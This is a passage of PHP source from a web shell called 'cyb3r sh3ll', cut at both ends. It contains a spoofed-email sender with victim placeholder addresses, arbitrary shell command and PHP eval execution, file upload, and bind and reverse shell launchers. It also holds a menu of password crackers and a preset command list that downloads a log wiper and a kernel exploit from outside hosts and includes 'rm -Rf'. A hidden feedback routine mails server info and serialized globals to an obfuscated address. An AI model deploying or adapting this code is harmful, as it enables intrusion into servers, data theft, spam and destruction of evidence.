                        <input name="from" value="your@email.id" onfocus="if(this.value == 'your@email.id')this.value = '';" onblur="if(this.value=='')this.value='your@email.id';"/>
                    </td>
                </tr>
                
                <tr>
                    <td >
                        To 
                    </td>
                    <td>
                        <input name="to" value="victim@target.com,victim2@target.com" onfocus="if(this.value == 'victim@target.com,victim2@target.com')this.value = '';" onblur="if(this.value=='')this.value='victim@target.com,victim2@target.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" name="subject" value="Just testing how deep i can fuck!" onfocus="if(this.value == 'Just testing how deep i can fuck!')this.value = '';" onblur="if(this.value=='')this.value='Just testing how deep i can fuck!';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td >
                        <textarea name="message" cols="25" rows="5" value="I cant forget the time, i was trying to learn all this stuff without some guidance .." onfocus="if(this.value == 'I cant forget the time, i was trying to learn all this stuff without some guidance ..')this.value = '';" onblur="if(this.value=='')this.value='I cant forget the time, i was trying to learn all this stuff without some guidance ..';">I cant forget the time, i was trying to learn all this stuff without some guidance ..</textarea>
                    </td>
					<td >
                        <input style="margin : 20px; margin-left: 10px; padding : 10px; width: 100px;" type="submit" value="Send! :D"/>
                    </td>
                </tr>
                
                
                
            </table>            
        </form>   
        <?php
    }

?>
		 </center>
		 </td>
		
		<td ><center>
		  
 <form action="" method="post" enctype="multipart/form-data"> 
      <table border="0" class="full"> 
       <tr><td class="taright"><label for="fromname" accesskey="r" class="sbold">F<span class="underline">r</span>om Name:</label></td><td colspan="2"><input type="text" id="fromname" name="fromname" maxlength="100" class="full" /><label for="from" accesskey="f" class="sbold"><span class="underline">F</span>rom E-mail:</label></td><td colspan="2"><input type="text" id="from" name="from" maxlength="100" class="full" value="your@email.id" onfocus="if(this.value == 'your@email.id')this.value = '';" onblur="if(this.value=='')this.value='your@email.id';"/></td></tr> 
       
       <tr><td class="taright"><label for="rcpt" accesskey="o" class="sbold">T<span class="underline">o</span>:</label></td><td colspan="2"><input type="text" id="rcpt" name="rcpt" maxlength="100" class="full" /><label for="subject" accesskey="j" class="sbold">Sub<span class="underline">j</span>ect:</label></td><td colspan="2"><input type="text" id="subject" name="subject" maxlength="100" class="full"  value="Just testing how deep i can fuck!" onfocus="if(this.value == 'Just testing how deep i can fuck!')this.value = '';" onblur="if(this.value=='')this.value='Just testing how deep i can fuck!';"/></td></tr> 
   
       <tr><td class="taright"><label for="reply" accesskey="p" class="sbold opt">Re<span class="underline">p</span>ly-To:</label></td><td colspan="2"><input type="text" id="reply" name="reply" maxlength="100" class="full" /><label for="errors" accesskey="s" class="sbold opt">Error<span class="underline">s</span>-To:</label></td><td colspan="2"><input type="text" id="errors" name="errors" maxlength="100" class="full" /></td></tr> 
       
       <tr><td class="taright"><label for="bcc" accesskey="b" class="sbold opt"><span class="underline">B</span>CC:</label></td><td colspan="2"><input type="text" id="bcc" name="bcc" maxlength="100" class="full" /><label for="attachment" accesskey="t" class="sbold opt">A<span class="underline">t</span>tachment:</label></td><td colspan="2"><input type="file" id="attachment" name="attachment" class="full" /></td></tr> 
       
       <tr><td class="taright sbold opt">Priority:</td><td colspan="2"><input type="radio" name="importance" id="lowest" value="lowest" /><label for="lowest" accesskey="w">&nbsp;Lo<span class="underline">w</span></label><input type="radio" name="importance" id="normal" value="normal" class="rbtn" checked="checked" /><label for="normal" accesskey="m">&nbsp;Nor<span class="underline">m</span>al</label><input type="radio" name="importance" id="highest" value="highest" class="rbtn" /><label for="highest" accesskey="g">&nbsp;Hi<span class="underline">g</span>h</label></td></tr>
	   
       <tr><td class="vatop taright"><label for="xmailer" accesskey="l" class="sbold opt"><span id="mailer">X-Mai<span class="underline">l</span>er:</span></label></td><td colspan="2"> 
         <select name="xmailer" id="xmailer"> 
          <option value="0" selected="selected">- none -</option> 
          <option value="1">Apple Mail</option> 
          <option value="2">ColdFusion MX Application Server</option> 
          <option value="3">E-Messenger</option> 
          <option value="4">KMail</option> 

          <option value="5">Lotus Notes</option> 
          <option value="6">Microsoft Office Outlook</option> 
          <option value="7">Microsoft Outlook Express</option> 
          <option value="8">Microsoft Outlook IMO</option> 
          <option value="9">Microsoft Windows Live Mail</option> 
          <option value="10">Microsoft Windows Mail</option> 
          <option value="11">Mozilla Thunderbird</option> 
          <option value="12">Novell GroupWise</option> 
          <option value="13">Novell GroupWise Internet Agent</option> 
          <option value="14">QUALCOMM Windows Eudora Version</option> 
          <option value="15">The Bat!</option> 
          <option value="16">YahooMailClassic YahooMailWebService</option> 
          <option value="99">Custom...</option> 
         </select> 
         
        </td></tr> 

       <tr><td class="taright"><label for="date" accesskey="d" class="sbold opt"><span class="underline">D</span>ate:</label></td><td colspan="2"><input type="text" id="date" name="date" maxlength="50" value="Thu, 10 Nov 2011 18:41:04 +0100" class="datewidth" />&nbsp;<input type="checkbox" id="current" name="current" checked="checked" /><label for="current" accesskey="u">&nbsp;C<span class="underline">u</span>rrent</label></td></tr> 
       <tr><td class="taright"><label for="charset" accesskey="a" class="sbold opt">Ch<span class="underline">a</span>rset:</label></td><td class="cchs"> 
         <select name="charset" id="charset" class="full"> 
          <option value="big5">big5</option> 
          <option value="euc-kr">euc-kr</option> 
          <option value="iso-2202-jp">iso-2202-jp</option> 
          <option value="iso-8859-1">iso-8859-1</option> 
          <option value="iso-8859-2">iso-8859-2</option> 
          <option value="iso-8859-3">iso-8859-3</option> 
          <option value="iso-8859-4">iso-8859-4</option> 
          <option value="iso-8859-5">iso-8859-5</option> 
          <option value="iso-8859-6">iso-8859-6</option> 
          <option value="iso-8859-7">iso-8859-7</option> 
          <option value="iso-8859-8">iso-8859-8</option> 
          <option value="koi8-r">koi8-r</option> 
          <option value="shift-jis">shift-jis</option> 
          <option value="utf-8" selected="selected">utf-8</option> 
          <option value="windows-1250">windows-1250</option> 
          <option value="windows-1251">windows-1251</option> 
          <option value="windows-1252">windows-1252</option> 
          <option value="windows-1253">windows-1253</option> 
          <option value="windows-1254">windows-1254</option> 
          <option value="windows-1255">windows-1255</option> 
          <option value="windows-1256">windows-1256</option> 
          <option value="windows-1257">windows-1257</option> 
          <option value="windows-1258">windows-1258</option> 
          <option value="windows-874">windows-874</option> 
          <option value="x-euc">x-euc</option> 
          <option value="99">Custom...</option> 
         </select> 
        </td><td><input type="text" name="mycharset" maxlength="50" class="full" /></td></tr> 
       <tr><td class="taright sbold opt">Content-Type:</td><td colspan="2"><input type="radio" name="ctype" id="plain" value="plain" checked="checked" /><label for="plain" accesskey="n">&nbsp;text/plai<span class="underline">n</span></label><input type="radio" name="ctype" id="html" value="html" class="rbtn" /><label for="html" accesskey="h" id="mrk">&nbsp;text/<span class="underline">h</span>tml</label><input type="hidden" name="rte" value="0" /></td></tr> 
       <tr><td class="vatop taright"><label for="text" accesskey="x" class="sbold">Te<span class="underline">x</span>t:</label></td><td colspan="2"><textarea cols="30" rows="5" id="text" name="text" value="I cant forget the time, i was trying to learn all this stuff without some guidance .." onfocus="if(this.value == 'I cant forget the time, i was trying to learn all this stuff without some guidance ..')this.value = '';" onblur="if(this.value=='')this.value='I cant forget the time, i was trying to learn all this stuff without some guidance ..';" />I cant forget the time, i was trying to learn all this stuff without some guidance ..</textarea></td></tr> 
         <tr><td></td><td colspan="2"><input type="reset" value="Clear" class="btn" /> <input type="submit" name="ok" value="Send" class="btn sbold slarger" /></td></tr> 
      </table> 
     </form> 

		</center></td>
		
	 </tr>
     
 </table>	<?php
 }
 
 if ($act == "nettools")
{
echo "<br><center><a href=\"".$surl."act=proxy\" ><b><u>Proxy </u></b></a><font color='silver'><b> | </b></font><a href=\"".$surl."act=whois\" ><b><u>Whois </u></b></a></center><br>";
}
 
 if ($act == "feedback")

{

 $suppmail = base64_decode("Y3liM3IuZ2xhZGlhdDByQGdtYWlsLmNvbQ==");

 if (!empty($submit))

 {

  $ticket = substr(md5(microtime()+rand(1,1000)),0,6);

  $body = "cyb3r sh3llv.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;

  if (!empty($fdbk_ref))

  {

   $tmp = @ob_get_contents();

   ob_clean();

   phpinfo();

   $phpinfo = base64_encode(ob_get_contents());

   ob_clean();

   echo $tmp;

   $body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";

  }

  mail($suppmail,"cyb3r sh3ll v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);

  echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>";

 }

 else {echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>Your name: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>Your e-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Message:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Attach server-info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: English, Hindi.<br><br><input type=\"submit\" name=\"submit\" value=\"Send\"></form>";}

}

if ($act == "systeminfo") {echo system('systeminfo');}

if ($act == "phpinfo") {@ob_clean(); phpinfo(); cyb3rexit(); }

if ($act == "upload")

{
  echo "<b>File upload:</b><br><form enctype=\"multipart/form-data\" action=\"\" method=POST>

Select file on your local computer: <input name=\"uploaded\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>

Save this file dir: <input name=\"path\" size=\"70\" value=\"".getcwd()."\"><br><br>

File-name (auto-fill): <input name=uploadfilename size=25><br><br>

<input type=submit name=submit value=\"Upload\">

</form>";
$target = $_POST['path']; 
 $target = $target .'\\'. basename( $_FILES['uploaded']['name']) ; 
 $ok=1; 
if (isset($_FILES['uploaded']['name'])) {
  if (file_exists($target))
      {
      echo $_FILES["uploaded"]["name"] . " already exists. ";
      }
    else   
      {
        if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target)) 
          { 
            echo "Upload: " . $_FILES["uploaded"]["name"] . "<br />";
            echo "Type: " . $_FILES["uploaded"]["type"] . "<br />";
            echo "Size: " . round(($_FILES["uploaded"]["size"] / 1024),3) . " Kb<br />";
            echo "Stored in: " . $target;
          } 
        else 
         { 
           echo "Sorry, there was a problem uploading your file."; 
         } 
      }
 }
}
if ($act == "whois")
{
global $t,$hcwd;
if (!empty($_REQUEST['server']) && !empty($_REQUEST['domain'])){
$server =$_REQUEST['server'];
$domain=$_REQUEST['domain']."\r\n";
$ser=fsockopen($server,43,$en,$es,5);
fputs($ser,$domain);
echo "<pre>";
while(!feof($ser))echo fgets($ser);
echo "</pre>";
fclose($ser);
}
else{
echo "<center><table width=\"50%\">Whois:<form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Server:</td><td bgcolor=\"#666666\"><input type=text value=\"";if (!empty($_REQUEST['server'])) echo htmlspecialchars($_REQUEST['server']);else echo "whois.geektools.com"; echo "\" name=server size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">domain:</td><td bgcolor=\"#808080\"><input type=text name=domain value=\"";if (!empty($_REQUEST['domain'])) echo htmlspecialchars($_REQUEST['domain']); else echo "google.com"; echo  "\" size=35></td><tr><td bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input class=buttons type=submit value=\"Do\"></td></tr></form></table></center>";
}
}



if ($act == "cracker")
{
 echo "
<br><center>
<a href=\"".$surl."act=hash\" >Hash</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=smtp\" >SMTP</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=pop3\" >POP3</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=imap\" >IMAP</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=ftp\" >FTP</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=snmp\" >SNMP</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=mysql\" >MySQL</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=htmlform\" >HTTP Form</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=basicauth\" >HTTP Auth(basic)</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=cpanel\" >CPANEL</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=dic\" >Dictionary Maker</a>
</center><br>";
}

if ($act == "shells") 
{ ?>
<TABLE style="BORDER-COLLAPSE: collapse; borderColor=#c0c0c0" cellSpacing=0 cellPadding=5 width="100%"  border=1>
     <tr> <!-- 1 -->
	   <td valign="top" width="50%" ><p align="center"><b>(: Bind/Reverse Shell :)</b></p></td>
	   <td valign="top" ><p align="center"><b>[: Web Shell :]</b></p></td>
	  
	 </tr>
     <tr><!-- 2 -->
	     <td valign="top" ><center>
            <?php

 $bndportsrcs = array(

  "cyb3r_bindport.pl"=>array("Using PERL","perl %path %port"),

  "cyb3r_bindport.c"=>array("Using C","%path %port %pass")

 );

 $bcsrcs = array(

  "cyb3r_backconn.pl"=>array("Using PERL","perl %path %host %port"),

  "cyb3r_backconn.c"=>array("Using C","%path %host %port")

 );

 $dpsrcs = array(

  "cyb3r_datapipe.pl"=>array("Using PERL","perl %path %localport %remotehost %remoteport"),

  "cyb3r_datapipe.c"=>array("Using C","%path %localport %remoteport %remotehost")

 );

 if (!is_array($bind)) {$bind = array();}

 if (!is_array($bc)) {$bc = array();}

 if (!is_array($datapipe)) {$datapipe = array();}

 

 if (!is_numeric($bind["port"])) {$bind["port"] = $bindport_port;}

 if (empty($bind["pass"])) {$bind["pass"] = $bindport_pass;}

  

 if (empty($bc["host"])) {$bc["host"] = getenv("REMOTE_ADDR");}

 if (!is_numeric($bc["port"])) {$bc["port"] = $bc_port;}

 

 if (empty($datapipe["remoteaddr"])) {$datapipe["remoteaddr"] = "irc.dalnet.ru:6667";}

 if (!is_numeric($datapipe["localport"])) {$datapipe["localport"] = $datapipe_localport;}

 if (!empty($bindsubmit))

 {

  echo "<b>Result of binding port:</b><br>";

  $v = $bndportsrcs[$bind["src"]];

  if (empty($v)) {echo "Unknown file!<br>";}

  elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}

  else

  {

   $w = explode(".",$bind["src"]);

   $ext = $w[count($w)-1];

   unset($w[count($w)-1]);

   $srcpath = join(".",$w).".".rand(0,999).".".$ext;

   $binpath = $tmpdir.join(".",$w).rand(0,999);

   if ($ext == "pl") {$binpath = $srcpath;}

   @unlink($srcpath);

   $fp = fopen($srcpath,"ab+");

   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}

   elseif (!$data = cyb3rgetsource($bind["src"])) {echo "Can't download sources!";}

   else

   {

    fwrite($fp,$data,strlen($data));

    fclose($fp);

    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  @unlink($srcpath);}

    $v[1] = str_replace("%path",$binpath,$v[1]);

    $v[1] = str_replace("%port",$bind["port"],$v[1]);

    $v[1] = str_replace("%pass",$bind["pass"],$v[1]);

    $v[1] = str_replace("//","/",$v[1]);

    $retbind = myshellexec($v[1]." > /dev/null &");

    sleep(5);

    $sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);

    if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}

    else {echo "Binding... ok! Connect to <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View binder's process</u></a></center>";}

   }

   echo "<br>";

  }

 }

 if (!empty($bcsubmit))

 {

  echo "<b>Result of back connection:</b><br>";

  $v = $bcsrcs[$bc["src"]];

  if (empty($v)) {echo "Unknown file!<br>";}

  else

  {

   $w = explode(".",$bc["src"]);

   $ext = $w[count($w)-1];

   unset($w[count($w)-1]);

   $srcpath = join(".",$w).".".rand(0,999).".".$ext;

   $binpath = $tmpdir.join(".",$w).rand(0,999);

   if ($ext == "pl") {$binpath = $srcpath;}

   @unlink($srcpath);

   $fp = fopen($srcpath,"ab+");

   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}

   elseif (!$data = cyb3rgetsource($bc["src"])) {echo "Can't download sources!";}

   else

   {

    fwrite($fp,$data,strlen($data));

    fclose($fp);

    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}

    $v[1] = str_replace("%path",$binpath,$v[1]);

    $v[1] = str_replace("%host",$bc["host"],$v[1]);

    $v[1] = str_replace("%port",$bc["port"],$v[1]);

    $v[1] = str_replace("//","/",$v[1]);

    $retbind = myshellexec($v[1]." > /dev/null &");

    echo "Now script try connect to ".htmlspecialchars($bc["host"]).":".htmlspecialchars($bc["port"])."...<br>";

   }

  }

 }

 if (!empty($dpsubmit))

 {

  echo "<b>Result of datapipe-running:</b><br>";

  $v = $dpsrcs[$datapipe["src"]];

  if (empty($v)) {echo "Unknown file!<br>";}

  elseif (fsockopen(getenv("SERVER_ADDR"),$datapipe["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}

  else

  {

   $srcpath = $tmpdir.$datapipe["src"];

   $w = explode(".",$datapipe["src"]);

   $ext = $w[count($w)-1];

   unset($w[count($w)-1]);

   $srcpath = join(".",$w).".".rand(0,999).".".$ext;

   $binpath = $tmpdir.join(".",$w).rand(0,999);

   if ($ext == "pl") {$binpath = $srcpath;}

   @unlink($srcpath);

   $fp = fopen($srcpath,"ab+");

   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}

   elseif (!$data = cyb3rgetsource($datapipe["src"])) {echo "Can't download sources!";}

   else

   {

    fwrite($fp,$data,strlen($data));

    fclose($fp);

    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}

    list($datapipe["remotehost"],$datapipe["remoteport"]) = explode(":",$datapipe["remoteaddr"]);

    $v[1] = str_replace("%path",$binpath,$v[1]);

    $v[1] = str_replace("%localport",$datapipe["localport"],$v[1]);

    $v[1] = str_replace("%remotehost",$datapipe["remotehost"],$v[1]);

    $v[1] = str_replace("%remoteport",$datapipe["remoteport"],$v[1]);

    $v[1] = str_replace("//","/",$v[1]);

    $retbind = myshellexec($v[1]." > /dev/null &");

    sleep(5);

    $sock = fsockopen("localhost",$datapipe["port"],$errno,$errstr,5);

    if (!$sock) {echo "I can't connect to localhost:".$datapipe["localport"]."! I think you should configure your firewall.";}

    else {echo "Running datapipe... ok! Connect to <b>".getenv("SERVER_ADDR").":".$datapipe["port"].", and you will connected to ".$datapipe["remoteaddr"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View datapipe process</u></a></center>";}

   }

   echo "<br>";

  }

 }

 ?><b>Binding port:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=shells><input type=hidden name=d value="<?php echo $d; ?>">Port: <input type=text name="bind[port]" value="<?php echo htmlspecialchars($bind["port"]); ?>">&nbsp;Password: <input type=text name="bind[pass]" value="<?php echo htmlspecialchars($bind["pass"]); ?>">&nbsp;<select name="bind[src]"><?php

 foreach($bndportsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bind["src"]) {echo " selected";} echo ">".$v[0]."</option>";}

 ?></select>&nbsp;<input type=submit name=bindsubmit value="Bind"></form>

<b>Back connection:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php echo $d; ?>">HOST: <input type=text name="bc[host]" value="<?php echo htmlspecialchars($bc["host"]); ?>">&nbsp;Port: <input type=text name="bc[port]" value="<?php echo htmlspecialchars($bc["port"]); ?>">&nbsp;<select name="bc[src]"><?php

foreach($bcsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}

?></select>&nbsp;<input type=submit name=bcsubmit value="Connect"></form>

Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php echo $bc_port; ?></b>"!<br><br>

<b>Datapipe:</b><br>
<form action="<?php echo $surl; ?>">
<input type=hidden name=act value=shells><input type=hidden name=d value="<?php echo $d; ?>">HOST: <input type=text name="datapipe[remoteaddr]" value="<?php echo htmlspecialchars($datapipe["remoteaddr"]); ?>">&nbsp;Local port: <input type=text name="datapipe[localport]" value="<?php echo htmlspecialchars($datapipe["localport"]); ?>">&nbsp;<select name="datapipe[src]"><?php

foreach($dpsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}

?></select>&nbsp;<input type=submit name=dpsubmit value="Run"></form><b>Note:</b> sources will be downloaded from remote server.



        
		 </center></td>
	    
		 <td ><center>
		 <p align="center"><b>[: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Enter Command to Execute:</b></a> :]</b>
		 
<form action="<?php echo $surl; ?>"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></p><br>
<div align="center">Useful Commands   </div>


    <form action="<?php echo $surl; ?>">

      <div align="center">

        <input type=hidden name=act value="cmd">

        <input type=hidden name="d" value="<?php echo $dispd; ?>">

          <SELECT NAME="cmd">

            <OPTION VALUE="uname -a">Kernel version</option>

              <OPTION VALUE="w">Logged in users</option>

                <OPTION VALUE="lastlog">Last to connect</option>

                  <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins</option>

                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!</option>

                    <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?</option>

                    <OPTION VALUE="which wget curl w3m lynx">Downloaders?</option>

                    <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO</option>

                    <OPTION VALUE="netstat -atup | grep IST">Open ports</option>

                    <OPTION VALUE="locate gcc">gcc installed?</option>

					<OPTION VALUE="rm -Rf">Format box (DANGEROUS)</option>

                    <OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)</option>

                    <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2</option>

                    <OPTION VALUE="./zap2">WIPELOGS PT3</option>

                    <OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3">Kernel attack (Krad.c) PT1 (If wget installed)</option>

                    <OPTION VALUE="./k3 1">Kernel attack (Krad.c) PT2 (L1)</option>

                    <OPTION VALUE="./k3 2">Kernel attack (Krad.c) PT2 (L2)</option>

                    <OPTION VALUE="./k3 3">Kernel attack (Krad.c) PT2 (L3)</option>

                    <OPTION VALUE="./k3 4">Kernel attack (Krad.c) PT2 (L4)</option>

                    <OPTION VALUE="./k3 5">Kernel attack (Krad.c) PT2 (L5)</option>

                  </SELECT>

        <input type=hidden name="cmd_txt" value="1">

        &nbsp;

        <input type=submit name=submit value="Execute">

          <br>

        Warning. Kernel may be alerted using higher levels </div>

    </form>

		 </center>
		 </td>
			
	 </tr>
     
 </table><?php
 
}

if ($act == "cmd")

{

if (trim($cmd) == "ps -aux") {$act = "processes";}

elseif (trim($cmd) == "tasklist") {$act = "processes";}

else

{

 @chdir($chdir);

 if (!empty($submit))

 {

  echo "<b>Result of execution this command</b>:<br>";

  $olddir = realpath(".");

  @chdir($d);

  $ret = myshellexec($cmd);

  $ret = convert_cyr_string($ret,"d","w");

  if ($cmd_txt)

  {

   $rows = count(explode("\r\n",$ret))+1;

   if ($rows < 10) {$rows = 10;}

   echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";

  }

  else {echo $ret."<br>";}

  @chdir($olddir);

 }

 else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}

 echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";

}

}

if ($act == "phpcode")
{
 echo "
<br><center>
<a href=\"".$surl."act=eval\" >PHP Code Evaluate</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=masscode\" >Mass Code Injector</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=obfuscate\" >PHP Obfuscator</a><font color='silver'> -|- </font>
<a href=\"".$surl."act=fuzzer\" >Web Server Fuzzer</a>
</center><br>";
}

if ($act == "eval")

{

 if (!empty($eval))

 {

  echo "<b>Result of execution this PHP-code</b>:<br>";

  $tmp = ob_get_contents();

  $olddir = realpath(".");

  @chdir($d);

  if ($tmp)

  {

   ob_clean();

   eval($eval);

   $ret = ob_get_contents();

   $ret = convert_cyr_string($ret,"d","w");

   ob_clean();

   echo $tmp;

   if ($eval_txt)

   {

    $rows = count(explode("\r\n",$ret))+1;

    if ($rows < 10) {$rows = 10;}

    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";

   }

   else {echo $ret."<br>";}

  }

  else

  {

   if ($eval_txt)

   {

    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";

    eval($eval);

    echo "</textarea>";

   }

   else {echo $ret;}

  }

  @chdir($olddir);

 }

 else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}

 echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";

}

if ($act == "proxy")
{
global $errorbox,$et,$footer,$hcwd;
echo "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" width=\"100%\"><form method=\"POST\"><tr><td width=\"20%\"><b>Navigator: </b><input type=text name=urL size=140 value=\""; if(!!empty($_REQUEST['urL'])) echo "http://www.edpsciences.org/htbin/ipaddress"; else echo htmlspecialchars($_REQUEST['urL']);echo "\">$hcwd<input type=submit class=buttons value=Go></td></tr></form></table>";
if (!empty($_REQUEST['urL'])){
$dir="";
$u=parse_url($_REQUEST['urL']);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
if(substr_count($file,'/')>1)$dir=substr($file,0,(strpos($file,'/')));
$url=@fsockopen($host, 80, $errno, $errstr, 12);
if(!$url)die("<br>$errorbox Can not connect to host!$et$footer");
fputs($url, "GET /$file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
while(!feof($url)){
$con = fgets($url);
$con = str_replace("href=mailto","HrEf=mailto",$con);
$con = str_replace("HREF=mailto","HrEf=mailto",$con);
$con = str_replace("href=\"mailto","HrEf=\"mailto",$con);
$con = str_replace("HREF=\"mailto","HrEf=\"mailto",$con);
$con = str_replace("href=\'mailto","HrEf=\"mailto",$con);
$con = str_replace("HREF=\'mailto","HrEf=\"mailto",$con);
$con = str_replace("href=\"http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=\"http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=\'http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=\'http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=http","HrEf=".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=http","HrEf=".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=\"","HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=\"","HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("href=\"","HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=\"","HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("href=","HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=","HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),$con);
echo $con;
}
fclose($url);
}
}


if ($act == "obfuscate")
{
  if ( isset($_POST['code']) &&
               $_POST['code'] != '')
    {
        $encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P
        $encode = '
